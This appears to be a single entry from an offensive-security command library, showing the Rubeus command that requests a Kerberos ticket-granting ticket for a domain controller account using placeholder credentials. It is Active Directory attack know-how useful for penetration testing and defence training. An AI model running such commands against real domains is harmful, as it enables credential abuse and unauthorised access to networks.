---
id: 219ba515-d923-478d-936e-54985ad12c77
name: Get TGT using Rubeus
type: command
executor: bash
data: Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local"
  /dc:"DomainController.domain.local" /nowrap
output: null
created_at: '2023-04-06T03:56:03.096858+00:00'
updated_at: '2023-04-10T20:26:11.555942+00:00'
---

# Get TGT using Rubeus

```bash
Rubeus.exe asktgt /user:"DomainController" /password:"ComputerPassword" /domain:"domain.local" /dc:"DomainController.domain.local" /nowrap
```
